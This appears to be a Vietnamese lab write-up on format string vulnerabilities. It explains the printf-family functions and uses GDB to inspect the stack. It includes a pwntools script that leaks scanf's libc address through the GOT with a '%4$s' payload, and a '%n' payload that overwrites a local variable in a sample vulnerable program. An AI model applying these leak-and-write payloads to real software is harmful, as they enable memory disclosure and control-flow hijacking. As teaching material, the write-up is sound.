# Format string
## Câu 1
### Question
Điền giới thiệu về các hàm trên bảng.

### Answer
| Hàm | Giới thiệu |
|---|---|
| `printf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào và in chuỗi đó ra stdout. |
| `fprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào và in chuỗi đó ra một output stream.|
| `vprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và in chuỗi đó ra stdout.|
| `vfprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và in chuỗi đó ra một output stream.|
| `sprintf` | Tạo một chuỗi từ định dạng và đối số cho trước và xuất chuỗi đó ra một mảng ký tự.|
| `snprintf` | Tạo một chuỗi từ định dạng và đối số cho trước và xuất chuỗi đó ra một mảng ký tự với giới hạn số lượng ký tự được xuất ra.|
| `vsprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và xuất chuỗi đó ra một mảng ký tự.|
| `vsnprintf` | Tạo một chuỗi từ định dạng và các đối số được truyền vào thông qua 1 tham số `va_list` và xuất chuỗi đó ra một mảng ký tự với giới hạn số lượng ký tự được xuất ra.|
| `setproctitle` | Đặt tên cho tiến trình sử dụng format string để tạo chuỗi tên. |
| `syslog` | Tạo log message để truyền vào system logger. Log message được tạo từ format string. |
| `err`, `verr`, `warn`, `vwarn` | Hiển thị error message. Error message được tạo từ format string. |

## Câu 2
### Question
Dùng GDB để debug và nhập giá trị `%3$x`.

### Answer
- Khi tiến trình chạy đến bước `printf(s)`, stack sẽ như sau:  

![image](https://user-images.githubusercontent.com/44528004/143236001-c1c91a66-a374-4262-a79d-3b016fdbe6d2.png)

- Kết quả chạy là:  

![image](https://user-images.githubusercontent.com/44528004/143236049-03b9b3a5-e6cc-451b-8740-806a14286986.png)

- Từ đây ta thấy được rằng `3$` sẽ tương ứng với đối số thứ 3 được truyền vào `printf`. Tuy nhiên, do chúng ta không truyền vào đối số nào cả nên tiến trình sẽ lấy giá trị cách đó 12 bytes ở phía trên của stack. Dựa vào stack bên trên, `0xffffd064` có giá trị `0xffffd070` là đối số 1, `0xffffd068` có giá trị `0xf7fc9410` là đối số 2, và `0xffffd06c` có giá trị `0x0804918d` là đối số 3.
- Vậy nếu `s = %08x.%08x.%08x` thì chương trình sẽ in ra `ffffd070.f7fc9410.0804918d`.
- Và nếu `s = %3$x` thì chương trình sẽ in ra giá trị của đối số thứ 3 là `0804918d`.


## Câu 3
### Question
Dùng GDB để debug và phân t ích tại sao có địa chỉ của `scanf`.

### Answer
- Ban đầu, khi ta truyền vào `AAAA%4$s`, chương trình bị treo vì khi hàm `printf('AAAA%4$s')` được thực thi, chương trình sẽ cố gắng truy xuất vào vùng nhớ `0x41414141` nhằm đọc các ký tự từ địa chỉ này để in ra màn hình. Tuy nhiên, `0x41414141` là vùng nhớ không thể truy xuất được nên chương trình bị treo.
> Specifier `%s` mong đợi đối số truyền vào là địa chỉ bắt đầu của chuỗi ký tự nên `printf` sẽ truy xuất đến vùng địa chỉ này để lấy giá trị.
- Trong trường hợp 4 bytes đầu của payload là địa chỉ của `__isoc99_scanf_got`, vì GOT nằm ở data segment mà data segment thì chương trình có thể truy xuất được nên sẽ không xảy ra lỗi. Bên cạnh đó, entry của `scanf` trên GOT trỏ tới địa chỉ thực của `scanf` trên libc nên ta thành công trong việc truy xuất vào địa chỉ thực của `scanf` trên libc.
- Script:  
```python
from pwn import *


sh = process('./leak')
e = ELF('./leak')

__isoc99_scanf_got = e.got['__isoc99_scanf']
print(hex(__isoc99_scanf_got))

payload = p32(__isoc99_scanf_got) + b'%4$s'
print(payload)

with open('payload.in', 'wb') as f:
    f.write(payload)

sh.sendline(payload)
sh.recvuntil(b'%4$s\n')
print(hex(u32(sh.recv()[4:8])))
sh.interactive()
```
- Trong mốt số trường hợp địa chỉ của `scanf` trong libc có chứa các byte đặc biệt như `0a`, `0b`, `0c`, `00`, ... thì `printf` sẽ terminate việc in chuỗi trên.
- Ví dụ khi chạy script exploit và dùng gdb để debug thì ta thấy rằng địa chỉ thực của `scanf` trên libc hiện tại đang là `0xf7e17300` và khi in ra ở little endian, byte `0x00` sẽ được đưa lên đầu và chuỗi sẽ bị terminate. Việc này dẫn tới việc script không in ra địa chỉ của `scanf` ra màn hình.  

  ![image](https://user-images.githubusercontent.com/44528004/143276062-c255d0e9-046f-4456-b7cf-cb8b6a3f60c3.png)

  ![image](https://user-images.githubusercontent.com/44528004/143276331-27f89422-1423-4ca2-b6d8-7edb4caaa0e8.png)

## Câu 4
Ta có đoạn code sau:
```c
#include <stdio.h>

int a = 123, b = 456;

int main() {
        int c = 789;
        char s[100];
        printf("%p\n", &c);
        scanf("%s", s);
        printf(s);
        if (c == 16) {
                puts("modified c.");
        }
        else if (a == 2) {
                puts("modified a for a small number.");
        }
        else if (b == 0x12345678) {
                puts("modified b for a big number!");
        }
        return 0;
}
```

- Ở đây, mục đích của ta là ghi đè giá trị của `c` thành 16 thì ta cần truyền vào payload có dạng `[overwriten_addr][padding]%[offset]$n`. Cụ thể hơn, payload để khai thác chương trình này sẽ là `addr_c%012d%6$n`.
    - `addr_c` là địa chỉ của biến `c`.
    - `%012d` sẽ khiến đọc 4 bytes tiếp theo trên stack và thêm padding để tạo thành 12 bytes.
    - `%6$n` sẽ đếm tổng số bytes đã đọc được ở thời điểm hiện tại và lưu vào đối số thứ 6. Với đối số thứ 6 này địa chỉ bắt đầu của buffer và đang trỏ tới địa chỉ của biến `c`. Do đó, tổng số bytes đã được đọc bởi format function là 16 sẽ được lưu vào địa chỉ của biến `c` và `c` sẽ bằng 16.

- Kết quả exploit:  

![image](https://user-images.githubusercontent.com/44528004/143288425-b2124f91-79e4-4085-b91d-59aa97a8f282.png)

> Tip: Trong trường hợp địa chỉ muốn ghi đè chứa các byte đặc biệt, ta có thể cân nhắc chuyển địa chỉ ghi đè về cuối payload.
